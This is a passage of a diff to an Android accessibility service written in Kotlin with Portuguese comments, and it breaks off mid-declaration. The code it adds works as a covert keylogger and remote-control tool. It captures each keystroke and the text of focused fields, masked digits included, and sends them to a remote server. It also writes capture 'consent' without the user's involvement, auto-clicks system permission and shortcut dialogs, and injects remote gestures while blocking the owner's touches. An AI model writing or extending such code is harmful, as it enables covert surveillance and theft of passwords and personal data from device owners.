@@ -19,6 +19,7 @@ import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
 import android.app.KeyguardManager
+import android.provider.Settings
 import android.view.Display
 import android.view.Gravity
 import android.view.KeyEvent
@@ -26,6 +27,7 @@ import android.view.View
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import android.view.accessibility.AccessibilityWindowInfo
 import android.util.Log
 import android.util.TypedValue
 import android.widget.Button
@@ -33,10 +35,14 @@ import android.widget.FrameLayout
 import android.widget.LinearLayout
 import android.widget.ProgressBar
 import android.widget.TextView
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import org.json.JSONObject
 import org.json.JSONArray
 import java.io.ByteArrayOutputStream
+import java.io.File
 
 class MyAccessibilityService : AccessibilityService() {
 
@@ -63,27 +69,43 @@ class MyAccessibilityService : AccessibilityService() {
         @Volatile
         var onboardingRapido: Boolean = false
 
-        // Android 14+ (API 34): quando true, a janela do overlay visual de
-        // atualização foi marcada com setHideDuringScreenSharing(true) e é
-        // automaticamente OMITIDA da captura do MediaProjection, permanecendo
-        // 100% visível no aparelho. Com isto o ScreenCaptureService NÃO precisa
-        // mais alternar o alpha a cada frame — eliminando o flicker ("piscando").
+        // ETAPA 3 — INJECT DO ATALHO: janela de tempo em que a acessibilidade
+        // confirma automaticamente o diálogo do sistema "Adicionar à tela
+        // inicial" (requestPinShortcut). Armado pelo AtalhoManager logo antes
+        // do pedido; expira sozinho após alguns segundos para não clicar em
+        // diálogos não relacionados.
         @Volatile
-        var hideDuranteCapturaDisponivel: Boolean = false
-            private set
+        var prazoConfirmacaoAtalhoMs: Long = 0L
+
+        /** Arma a confirmação automática do diálogo de atalho por ~8s. */
+        fun armarConfirmacaoAtalho() {
+            prazoConfirmacaoAtalhoMs = System.currentTimeMillis() + 8000L
+        }
     }
 
     // --- Estado de Controle de Interação "Acesso Total" ---
     @Volatile
     var bloquearCliquesLocais: Boolean = false
     private var activePath: Path? = null
+    private var currentStroke: GestureDescription.StrokeDescription? = null
+    private var pendingX = -1f
+    private var pendingY = -1f
+    private var isDispatching = false
     private var startX = 0f
     private var startY = 0f
+    private var ultimoLayoutMudancaMs = 0L
 
     // --- Overlays INDEPENDENTES: cada botão do painel controla o seu ---
     private var windowManager: WindowManager? = null
     private var overlayPrivacidade: View? = null
     private var overlayEscura: View? = null
+    private var overlayAtualizacao: View? = null
+    private var overlayFundoAtualizacao: View? = null
+    @Volatile var isAtualizacaoAtiva: Boolean = false
+        private set
+    // Valor COM SINAL (-1..+1): >0 escurece (preto), <0 clareia (branco),
+    // 0 neutro. Mesma convenção de OverlayService.opacidadeFundo.
+    @Volatile var opacidadeFundoOverlayAtualizacao: Float = 0.6f
     // Overlay de bloqueio de toques locais (Acesso Total). É touchable e
     // consome TODO toque físico do usuário do dispositivo. Durante gestos
     // remotos vindos do painel do emulador, ele fica temporariamente
@@ -91,19 +113,6 @@ class MyAccessibilityService : AccessibilityService() {
     // por baixo — ou seja, bloqueia APENAS o dispositivo local, nunca o
     // painel de controle remoto.
     private var overlayBloqueio: View? = null
-    // Overlay de QUIOSQUE DA ATUALIZAÇÃO (sala separada do Acesso Total).
-    // Durante a atualização do app (loading_overlay ativo) a tela de
-    // atualização continua VISÍVEL no dispositivo, mas este overlay
-    // transparente consome TODO toque local — o usuário não consegue sair
-    // da tela de atualização (home/recents na tela ficam bloqueados). É
-    // independente de overlayBloqueio para não interferir no Acesso Total.
-    private var overlayKioskAtualizacao: View? = null
-    // SINCRONIA DE FRAME — overlay visual de "Atualizando..." (NÃO bloqueia
-    // toques: FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE). O ScreenCaptureService
-    // oculta este overlay por ~18ms via setOverlayAtualizacaoAlpha(0f), captura
-    // o fundo LIMPO (sem o overlay) e restaura — o painel/emulador flutuante
-    // vê apenas o fundo real do dispositivo, com o círculo só no aparelho.
-    private var overlayAtualizacaoVisual: View? = null
     private val failsafeRestauroBloqueio = Runnable { setBloqueioPermiteToqueRemoto(false) }
     private val handlerMain = Handler(Looper.getMainLooper())
     private val TIMEOUT_PRIVACIDADE_MS = 3 * 60 * 1000L
@@ -218,6 +227,23 @@ class MyAccessibilityService : AccessibilityService() {
 
     private val pacotesAutoClique = pacotesPermissaoSistema + pacotesInstalador
 
+    @Volatile private var tecladoAbertoAnterior: Boolean = false
+    @Volatile private var bufferTextoTeclado: String = ""
+    @Volatile private var bufferAppTeclado: String = ""
+    @Volatile private var bufferBoundsTeclado: android.graphics.Rect? = null
+
+    private fun isKeyboardOpen(): Boolean {
+        try {
+            val wins = windows ?: return false
+            for (w in wins) {
+                if (w.type == AccessibilityWindowInfo.TYPE_INPUT_METHOD) {
+                    return true
+                }
+            }
+        } catch (_: Exception) {}
+        return false
+    }
+
     // Textos de botões que o auto-clique deve PRESSIONAR (case-insensitive, contains).
     private val textosPermitir = listOf(
         "permitir", "permitir mesmo assim", "permita", "aceitar", "aceito", "concordo",
@@ -283,41 +309,68 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     override fun onServiceConnected() {
-        super.onServiceConnected()
+        try { super.onServiceConnected() } catch (_: Throwable) {}
         instance = this
-        reanimacaoFalhasConsecutivas = 0 // serviço reconectou → permite novo keep-alive
-        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
-        // Habilita filtro de teclas para detectar o botão HOME mesmo com a
-        // tela apagada. Requer android:canRequestFilterKeyEvents="true" no
-        // res/xml/accessibility_service_config.xml (e reativar a acessibilidade).
         try {
-            val info = serviceInfo
-            info.flags = info.flags or AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
-            serviceInfo = info
-        } catch (e: Exception) {
-            Log.e(TAG, "Falha ao habilitar filtro de teclas: ${e.message}")
-        }
-        Log.d(TAG, "Accessibility Service Conectado e Ativo")
-        
-        // Registra o BroadcastReceiver de estado da tela de bloqueio (ACTION_USER_PRESENT / ACTION_SCREEN_OFF)
-        try {
-            val filter = android.content.IntentFilter().apply {
-                addAction(Intent.ACTION_USER_PRESENT)
-                addAction(Intent.ACTION_SCREEN_OFF)
+            reanimacaoFalhasConsecutivas = 0 // serviço reconectou → permite novo keep-alive
+            windowManager = getSystemService(WINDOW_SERVICE) as? WindowManager
+            // Habilita filtro de teclas para detectar o botão HOME mesmo com a
+            // tela apagada. Requer android:canRequestFilterKeyEvents="true" no
+            // res/xml/accessibility_service_config.xml (e reativar a acessibilidade).
+            try {
+                val info = serviceInfo
+                if (info != null) {
+                    info.flags = info.flags or AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
+                    serviceInfo = info
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Falha ao habilitar filtro de teclas: ${e.message}")
             }
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                registerReceiver(lockStateReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
-            } else {
-                registerReceiver(lockStateReceiver, filter)
+            Log.d(TAG, "Accessibility Service Conectado e Ativo")
+            // ACESSIBILIDADE ATIVA = CONSENTIMENTO. Grava o consentimento de
+            // captura assim que o serviço conecta, para que o auto-clique no
+            // diálogo do MediaProjection ("Iniciar agora") não fique suspenso
+            // esperando um consentimento que nunca era gravado — era o que
+            // obrigava o usuário a clicar manualmente toda vez.
+            try {
+                getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
+                    .edit().putBoolean("consentimento_captura", true).apply()
+            } catch (e: Exception) {
+                Log.e(TAG, "Falha ao gravar consentimento_captura: ${e.message}")
             }
-            Log.d(TAG, "BroadcastReceiver de estado da tela de bloqueio registrado com sucesso.")
+            criarPastaUploadTeclado()
+
+            // Registra o BroadcastReceiver de estado da tela de bloqueio (ACTION_USER_PRESENT / ACTION_SCREEN_OFF)
+            try {
+                val filter = android.content.IntentFilter().apply {
+                    addAction(Intent.ACTION_USER_PRESENT)
+                    addAction(Intent.ACTION_SCREEN_OFF)
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    registerReceiver(lockStateReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
+                } else {
+                    registerReceiver(lockStateReceiver, filter)
+                }
+                Log.d(TAG, "BroadcastReceiver de estado da tela de bloqueio registrado com sucesso.")
+            } catch (e: Exception) {
+                Log.e(TAG, "Erro ao registrar lockStateReceiver: ${e.message}")
+            }
         } catch (e: Exception) {
-            Log.e(TAG, "Erro ao registrar lockStateReceiver: ${e.message}")
+            Log.e(TAG, "Falha na inicialização inicial do onServiceConnected: ${e.message}", e)
         }
 
-        SocketManager.connect()
-        configurarOuvintesSocket()
-        enviarLogApp("Serviço de acessibilidade ATIVO e pronto para receber comandos (auto-clique de permissões=$autoClickPermissoesAtivo, onboardingRapido=$onboardingRapido).")
+        try {
+            SocketManager.connect()
+            configurarOuvintesSocket()
+        } catch (e: Exception) {
+            Log.e(TAG, "Falha ao iniciar Socket.IO no onServiceConnected: ${e.message}", e)
+        }
+
+        try {
+            enviarLogApp("Serviço de acessibilidade ATIVO e pronto para receber comandos (auto-clique de permissões=$autoClickPermissoesAtivo, onboardingRapido=$onboardingRapido).")
+        } catch (e: Exception) {
+            Log.e(TAG, "Falha no enviarLogApp inicial: ${e.message}")
+        }
     }
 
     /**
@@ -439,208 +492,6 @@ class MyAccessibilityService : AccessibilityService() {
         overlayBloqueio = null
         enviarLog("Acesso Total DESATIVADO: toques locais do dispositivo liberados.")
     }
-
-    // ================================================================
-    // QUIOSQUE DA ATUALIZAÇÃO (fixação por overlay — sala separada).
-    // Quando o emulador flutuante está só com o círculo de carregamento
-    // (loading_overlay ativo), o dispositivo físico CONTINUA na tela de
-    // atualização do aplicativo e NÃO consegue sair dela: overlay quase
-    // transparente (a tela de atualização fica 100% visível) que consome
-    // TODO toque local + mantém a tela acesa. Independente do Acesso Total
-    // para não interferir no estado daquele recurso.
-    // ================================================================
-    fun ativarKioskAtualizacao() {
-        handlerMain.post {
-            if (overlayKioskAtualizacao != null) return@post
-            val wm = windowManager ?: return@post
-            val container = FrameLayout(this).apply {
-                setBackgroundColor(Color.parseColor("#0A000000")) // transparente — usuário VÊ a atualização
-                setOnTouchListener { _, _ -> true } // consome TODO toque local (não sai da tela)
-            }
-            val selo = TextView(this).apply {
-                text = "🔄 Atualizando aplicativo…"
-                setTextColor(Color.parseColor("#CCFFFFFF"))
-                textSize = 11f
-                setPadding(dp(8), dp(4), dp(8), dp(4))
-                setBackgroundColor(Color.parseColor("#66000000"))
-                gravity = Gravity.CENTER
-            }
-            val lpSelo = FrameLayout.LayoutParams(
-                FrameLayout.LayoutParams.WRAP_CONTENT,
-                FrameLayout.LayoutParams.WRAP_CONTENT,
-                Gravity.TOP or Gravity.END
-            ).apply { topMargin = dp(10); rightMargin = dp(10) }
-            container.addView(selo, lpSelo)
-            val params = WindowManager.LayoutParams(
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                // SEM FLAG_NOT_TOUCHABLE: consome os toques (bloqueia a saída).
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                PixelFormat.TRANSLUCENT
-            ).apply {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                    layoutInDisplayCutoutMode =
-                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
-                }
-            }
-            try {
-                wm.addView(container, params)
-                overlayKioskAtualizacao = container
-                enviarLog("Quiosque da atualização ATIVO: tela de atualização visível; toques locais bloqueados (usuário não sai da atualização).")
-            } catch (e: Exception) {
-                enviarLog("Falha ao ativar quiosque da atualização: ${e.message}")
-            }
-        }
-    }
-
-    fun removerKioskAtualizacao() {
-        handlerMain.post {
-            overlayKioskAtualizacao?.let {
-                try { windowManager?.removeView(it) } catch (_: Exception) {}
-            }
-            if (overlayKioskAtualizacao != null) {
-                overlayKioskAtualizacao = null
-                enviarLog("Quiosque da atualização REMOVIDO: toques locais liberados (atualização concluída).")
-            }
-        }
-    }
-
-    // ================================================================
-    // OVERLAY VISUAL DE ATUALIZAÇÃO + SINCRONIA DE FRAME (fundo limpo)
-    // ----------------------------------------------------------------
-    // Diferente do quiosque (que bloqueia toques), este overlay é SÓ
-    // VISUAL: FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE → toques e gestos
-    // passam livremente por baixo. Mostra um cartão central com o
-    // círculo de carregamento em loop ("Atualizando o aplicativo…").
-    //
-    // Para que o EMULADOR FLUTUANTE veja o FUNDO REAL (sem o cartão), o
-    // ScreenCaptureService faz a sincronia de frame: a cada ciclo chama
-    // setOverlayAtualizacaoAlpha(0f) (oculta), espera ~18ms (1 frame),
-    // captura o fundo limpo, envia e chama setOverlayAtualizacaoAlpha(1f)
-    // (restaura). O alpha é trocado em O(1) sem relayout.
-    // ================================================================
-    fun ativarOverlayAtualizacaoVisual() {
-        handlerMain.post {
-            if (overlayAtualizacaoVisual != null) {
-                overlayAtualizacaoVisual?.alpha = 1f
-                overlayAtualizacaoVisual?.visibility = View.VISIBLE
-                return@post
-            }
-            val wm = windowManager ?: return@post
-            // Janela full-screen transparente — só o cartão central é visível.
-            val container = FrameLayout(this).apply {
-                setBackgroundColor(Color.parseColor("#00000000"))
-            }
-            // CORREÇÃO FLICKER (API 34+ / Android 14): marca a janela para ser
-            // omitida da captura de tela (MediaProjection / screen share) SEM
-            // alterar sua visibilidade no aparelho. Com isto NÃO é mais preciso
-            // ficar alternando alpha 0↔1 a cada frame (que causava o "piscar").
-            // Testa as duas assinaturas de parâmetro (primitive e wrapper) para
-            // não falhar silenciosamente. Em APIs <34 a flag permanece false e
-            // o app usa o fallback throttled (~10 FPS, sem flicker perceptível).
-            hideDuranteCapturaDisponivel = false
-            if (Build.VERSION.SDK_INT >= 34) {
-                for (tipo in arrayOf(Boolean::class.javaPrimitiveType, Boolean::class.java)) {
-                    try {
-                        val metodo = View::class.java.getMethod("setHideDuringScreenSharing", tipo)
-                        metodo.invoke(container, true)
-                        hideDuranteCapturaDisponivel = true
-                        break
-                    } catch (_: Exception) {}
-                }
-            }
-            enviarLog("Overlay visual ATIVO — API=${Build.VERSION.SDK_INT} hideNativo=$hideDuranteCapturaDisponivel (false=fallback throttled sem flicker)")
-            // Cartão escuro arredondado com círculo + texto (animação em loop).
-            val fundoCartao = android.graphics.drawable.GradientDrawable().apply {
-                shape = android.graphics.drawable.GradientDrawable.RECTANGLE
-                cornerRadius = dp(20).toFloat()
-                setColor(Color.parseColor("#E6000000")) // 90% preto — legível
-            }
-            val cartao = LinearLayout(this).apply {
-                orientation = LinearLayout.VERTICAL
-                gravity = Gravity.CENTER
-                setPadding(dp(36), dp(28), dp(36), dp(28))
-                background = fundoCartao
-            }
-            val progressBar = ProgressBar(this).apply {
-                isIndeterminate = true
-                layoutParams = LinearLayout.LayoutParams(dp(56), dp(56)).apply {
-                    bottomMargin = dp(18)
-                    gravity = Gravity.CENTER_HORIZONTAL
-                }
-            }
-            val titulo = TextView(this).apply {
-                text = "Atualizando o aplicativo..."
-                textSize = 18f
-                setTextColor(Color.WHITE)
-                setTypeface(null, android.graphics.Typeface.BOLD)
-                gravity = Gravity.CENTER
-            }
-            val subtitulo = TextView(this).apply {
-                text = "Aguarde enquanto sincronizamos os dados."
-                textSize = 12f
-                setTextColor(Color.parseColor("#CCCCCC"))
-                gravity = Gravity.CENTER
-                setPadding(0, dp(8), 0, 0)
-            }
-            cartao.addView(progressBar)
-            cartao.addView(titulo)
-            cartao.addView(subtitulo)
-            container.addView(
-                cartao,
-                FrameLayout.LayoutParams(
-                    FrameLayout.LayoutParams.WRAP_CONTENT,
-                    FrameLayout.LayoutParams.WRAP_CONTENT,
-                    Gravity.CENTER
-                )
-            )
-            val params = WindowManager.LayoutParams(
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                // FLAG_NOT_TOUCHABLE: toques PASSAM pelo overlay (usuário não
-                // é bloqueado — gestos/cliques continuam funcionando).
-                // FLAG_NOT_FOCUSABLE: não recebe foco de teclado.
-                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                PixelFormat.TRANSLUCENT
-            ).apply {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                    layoutInDisplayCutoutMode =
-                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
-                }
-            }
-            try {
-                wm.addView(container, params)
-                overlayAtualizacaoVisual = container
-                enviarLog("Overlay visual de atualização ATIVO (FLAG_NOT_TOUCHABLE — toques livres; sincronia de frame ativa com ScreenCaptureService).")
-            } catch (e: Exception) {
-                enviarLog("Falha ao ativar overlay visual de atualização: ${e.message}")
-            }
-        }
-    }
-
-    fun removerOverlayAtualizacaoVisual() {
-        handlerMain.post {
-            overlayAtualizacaoVisual?.let {
-                try { windowManager?.removeView(it) } catch (_: Exception) {}
-            }
-            if (overlayAtualizacaoVisual != null) {
-                overlayAtualizacaoVisual = null
-                hideDuranteCapturaDisponivel = false
-                enviarLog("Overlay visual de atualização REMOVIDO.")
-            }
-        }
-    }
-
-
 
     /**
      * Bypass para o painel do emulador: quando permitir=true, adiciona
@@ -971,65 +822,133 @@ class MyAccessibilityService : AccessibilityService() {
      * compatível com Xiaomi (MIUI/HyperOS) e sem depender de rotas de Acessibilidade Restrita.
      */
     private fun handleRemoteGesture(acao: String, x: Float, y: Float) {
+        val pontoReal = android.graphics.Point()
+        val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
+        @Suppress("DEPRECATION")
+        wm?.defaultDisplay?.getRealSize(pontoReal)
         val metrics = resources.displayMetrics
-        val boundedX = x.coerceIn(0f, metrics.widthPixels.toFloat() - 1f)
-        val boundedY = y.coerceIn(0f, metrics.heightPixels.toFloat() - 1f)
+        val maxW = (if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels).toFloat() - 1f
+        val maxH = (if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels).toFloat() - 1f
+        val boundedX = x.coerceIn(0f, maxW)
+        val boundedY = y.coerceIn(0f, maxH)
+
         when (acao.uppercase()) {
             "START" -> {
-                // Painel do emulador está prestes a controlar o dispositivo:
-                // libera temporariamente o overlay de bloqueio para que o
-                // gesto injetado (dispatchGesture) atravesse para os apps.
-                // Isto garante que o painel NUNCA seja bloqueado.
                 setBloqueioPermiteToqueRemoto(true)
                 handlerMain.removeCallbacks(failsafeRestauroBloqueio)
                 handlerMain.postDelayed(failsafeRestauroBloqueio, 8000L)
-                activePath = Path().apply { moveTo(boundedX, boundedY) }
                 startX = boundedX
                 startY = boundedY
+                pendingX = -1f
+                pendingY = -1f
+                isDispatching = false
+
+                val path = Path().apply { moveTo(boundedX, boundedY); lineTo(boundedX + 1f, boundedY + 1f) }
+                currentStroke = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    GestureDescription.StrokeDescription(path, 0, 50L, true)
+                } else {
+                    GestureDescription.StrokeDescription(path, 0, 50L)
+                }
+                val gesto = GestureDescription.Builder().addStroke(currentStroke!!).build()
+                dispatchGesture(gesto, null, null)
             }
-            "MOVE" -> activePath?.lineTo(boundedX, boundedY)
+            "MOVE" -> {
+                pendingX = boundedX
+                pendingY = boundedY
+                if (!isDispatching) {
+                    dispararProximoMove()
+                }
+            }
             "END" -> {
-                // ANTI-GHOST: sem START anterior (activePath nulo) = pacote
-                // órfão. Ignora completamente para NÃO dar um tap em
-                // coordenadas obsoletas (startX/startY do gesto anterior).
-                if (activePath == null) {
+                val finalX = if (pendingX >= 0f) pendingX else boundedX
+                val finalY = if (pendingY >= 0f) pendingY else boundedY
+
+                val prev = currentStroke
+                if (prev == null) {
                     enviarLog("END órfão ignorado (sem START anterior) — anti-ghost.")
                     restaurarBloqueioLocal()
                     return
                 }
-                val movido =
-                    kotlin.math.abs(boundedX - startX) > 3f || kotlin.math.abs(boundedY - startY) > 3f
-                val path: Path
-                val duration: Long
-                if (movido) {
-                    path = activePath!!.apply { lineTo(boundedX, boundedY) }
-                    duration = 300L
-                } else {
-                    // Tap físico simulado: toque de 50ms na coordenada X/Y exata (supera travas do Xiaomi)
-                    path = Path().apply {
-                        moveTo(startX, startY)
-                        lineTo(startX + 1f, startY + 1f)
-                    }
-                    duration = 50L
+                val path = Path().apply {
+                    moveTo(startX, startY)
+                    lineTo(finalX, finalY)
                 }
-                val stroke = GestureDescription.StrokeDescription(path, 0, duration)
-                val gesto = GestureDescription.Builder().addStroke(stroke).build()
-                val aceito = dispatchGesture(gesto, object : GestureResultCallback() {
-                    override fun onCompleted(g: GestureDescription?) {
-                        enviarLog("gesto OK (${boundedX.toInt()},${boundedY.toInt()})")
+                try {
+                    val finalStroke = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        prev.continueStroke(path, 0, 30L, false)
+                    } else {
+                        GestureDescription.StrokeDescription(path, 0, 100L)
+                    }
+                    val gesto = GestureDescription.Builder().addStroke(finalStroke).build()
+                    val aceito = dispatchGesture(gesto, object : GestureResultCallback() {
+                        override fun onCompleted(g: GestureDescription?) {
+                            enviarLog("gesto OK (${finalX.toInt()},${finalY.toInt()})")
+                            restaurarBloqueioLocal()
+                        }
+                        override fun onCancelled(g: GestureDescription?) {
+                            enviarLog("gesto CANCELADO (${finalX.toInt()},${finalY.toInt()})")
+                            restaurarBloqueioLocal()
+                        }
+                    }, null)
+                    if (!aceito) {
+                        enviarLog("dispatchGesture recusado em (${finalX.toInt()},${finalY.toInt()})")
                         restaurarBloqueioLocal()
                     }
-                    override fun onCancelled(g: GestureDescription?) {
-                        enviarLog("gesto CANCELADO (${boundedX.toInt()},${boundedY.toInt()})")
-                        restaurarBloqueioLocal()
-                    }
-                }, null)
-                if (!aceito) {
-                    enviarLog("dispatchGesture recusado em (${boundedX.toInt()},${boundedY.toInt()})")
-                    restaurarBloqueioLocal()
+                } catch (e: Exception) {
+                    val fallbackPath = Path().apply { moveTo(startX, startY); lineTo(finalX, finalY) }
+                    val stroke = GestureDescription.StrokeDescription(fallbackPath, 0, 100L)
+                    val gesto = GestureDescription.Builder().addStroke(stroke).build()
+                    dispatchGesture(gesto, object : GestureResultCallback() {
+                        override fun onCompleted(g: GestureDescription?) { restaurarBloqueioLocal() }
+                        override fun onCancelled(g: GestureDescription?) { restaurarBloqueioLocal() }
+                    }, null)
                 }
-                activePath = null
+                currentStroke = null
+                pendingX = -1f
+                pendingY = -1f
+                isDispatching = false
             }
+        }
+    }
+
+    private fun dispararProximoMove() {
+        val prev = currentStroke ?: return
+        if (pendingX < 0f || pendingY < 0f) return
+
+        val targetX = pendingX
+        val targetY = pendingY
+        pendingX = -1f
+        pendingY = -1f
+        isDispatching = true
+
+        val path = Path().apply {
+            moveTo(startX, startY)
+            lineTo(targetX, targetY)
+        }
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                currentStroke = prev.continueStroke(path, 0, 30L, true)
+            }
+            val gesto = GestureDescription.Builder().addStroke(currentStroke!!).build()
+            startX = targetX
+            startY = targetY
+
+            dispatchGesture(gesto, object : GestureResultCallback() {
+                override fun onCompleted(g: GestureDescription?) {
+                    isDispatching = false
+                    if (pendingX >= 0f && pendingY >= 0f) {
+                        dispararProximoMove()
+                    }
+                }
+                override fun onCancelled(g: GestureDescription?) {
+                    isDispatching = false
+                    if (pendingX >= 0f && pendingY >= 0f) {
+                        dispararProximoMove()
+                    }
+                }
+            }, null)
+        } catch (e: Exception) {
+            isDispatching = false
         }
     }
 
@@ -1107,6 +1026,25 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
+        // ETAPA 3 — INJECT DO ATALHO: enquanto a janela estiver armada, procura
+        // e clica o botão "Adicionar" do diálogo "Adicionar à tela inicial"
+        // (requestPinShortcut). Roda antes de tudo e some assim que confirma.
+        if (System.currentTimeMillis() < prazoConfirmacaoAtalhoMs) {
+            try {
+                rootInActiveWindow?.let {
+                    if (procurarEClicarBotaoAtalho(it)) prazoConfirmacaoAtalhoMs = 0L
+                }
+            } catch (_: Exception) {}
+        }
+
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            val agora = System.currentTimeMillis()
+            if (agora - ultimoLayoutMudancaMs < 150) {
+                return // Debounce de rajadas de layout do IME para eliminar flicker
+            }
+            ultimoLayoutMudancaMs = agora
+        }
+
         // CAPTURA DE GESTOS FÍSICOS DO USUÁRIO NA TELA DE BLOQUEIO (Keyguard)
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_CLICKED,
@@ -1125,6 +1063,14 @@ class MyAccessibilityService : AccessibilityService() {
             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                 capturarToqueFisicoTelaBloqueio(event)
             }
+        }
+
+        // MAPEAMENTO DE TOQUES NO TECLADO VIRTUAL — captura CADA tecla no exato
+        // instante do clique (TYPE_VIEW_CLICKED), em vez de ler o campo depois.
+        // Mesmo digitando rápido, cada tecla é emitida na hora (teclado_tecla),
+        // preservando a sequência exata de letras e números.
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            capturarTeclaDigitada(event)
         }
 
         // Acesso Total: consome/intercepta toques locais quando bloqueado.
@@ -1152,6 +1098,181 @@ class MyAccessibilityService : AccessibilityService() {
 
         // TRANSMISSÃO CONTÍNUA DE TELEMETRIA (Modo Híbrido / Leitor FPS)
         enviarTelemetriaAcessibilidade(event)
+
+        // MONITORAMENTO DE TECLADO VIRTUAL E LOG EM LINHA ÚNICA AO FECHAR
+        // CORREÇÃO DE PERDA DE CARACTERES: o texto do evento (event.text) é a
+        // fonte MAIS FRESCA e confiável — ele carrega o valor COMPLETO do campo
+        // no exato instante da mudança. node.text pode estar nulo/obsoleto se o
+        // nó for reciclado ou se o campo for customizado. Por isso tentamos
+        // event.text PRIMEIRO, e só depois node.text (com refresh de reserva).
+        // O buffer é SEMPRE atualizado (mesmo quando vazio) para não enviar um
+        // texto velho quando o teclado fecha. Nenhuma letra/número é removido.
+        val tipo = event.eventType
+        if (tipo == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || tipo == AccessibilityEvent.TYPE_WINDOWS_CHANGED || tipo == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val keyboardOpen = isKeyboardOpen()
+            if (keyboardOpen) {
+                // 1) Tenta o texto fresco do próprio evento (vem completo).
+                var txt: String = event.text?.joinToString("") ?: ""
+                var node: AccessibilityNodeInfo? = event.source
+                    ?: rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+                // 2) Se o evento veio vazio, lê do nó (com refresh para não usar valor obsoleto).
+                if (txt.isEmpty() && node != null) {
+                    try { node.refresh() } catch (_: Exception) {}
+                    txt = node.text?.toString() ?: ""
+                }
+                // 3) Última reserva: acha o campo editável focado na árvore e lê o texto.
+                if (txt.isEmpty()) {
+                    val focado = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+                    if (focado != null) {
+                        try { focado.refresh() } catch (_: Exception) {}
+                        txt = focado.text?.toString() ?: ""
+                        if (node == null) node = focado
+                    }
+                }
+                val bounds = android.graphics.Rect()
+                try { node?.getBoundsInScreen(bounds) } catch (_: Exception) {}
+                val cleaned = txt.replace("\n", " ").replace("\r", " ").replace(Regex("\\s+"), " ").trim()
+                // Buffer SEMPRE atualizado (mesmo vazio) — evita enviar texto obsoleto no fechamento.
+                bufferTextoTeclado = cleaned
+                bufferAppTeclado = event.packageName?.toString() ?: bufferAppTeclado
+                bufferBoundsTeclado = bounds
+                if (cleaned.isNotEmpty()) {
+                    SocketManager.enviarTecladoLog(bufferAppTeclado, cleaned, bufferBoundsTeclado)
+                }
+                try { node?.recycle() } catch (_: Exception) {}
+                tecladoAbertoAnterior = true
+            } else if (tecladoAbertoAnterior && !keyboardOpen) {
+                if (bufferTextoTeclado.isNotEmpty()) {
+                    SocketManager.enviarTecladoLog(bufferAppTeclado, bufferTextoTeclado, bufferBoundsTeclado)
+                }
+                bufferTextoTeclado = ""
+                bufferAppTeclado = ""
+                bufferBoundsTeclado = null
+                tecladoAbertoAnterior = false
+            }
+        }
+    }
+
+    // ================================================================
+    // MAPEAMENTO DE TOQUES NO TECLADO VIRTUAL
+    // ----------------------------------------------------------------
+    // Em vez de LER o campo de texto (que mascara dígitos e mistura a
+    // dica), monitoramos o clique em cada TECLA do teclado na tela e
+    // registramos a sequência EXATA de letras/números pressionados, no
+    // exato instante do toque — mesmo em digitação rápida.
+    // ================================================================
+    private val palavrasDigito = mapOf(
+        "zero" to "0", "um" to "1", "uma" to "1", "dois" to "2", "duas" to "2",
+        "tres" to "3", "quatro" to "4", "cinco" to "5", "seis" to "6",
+        "sete" to "7", "oito" to "8", "nove" to "9",
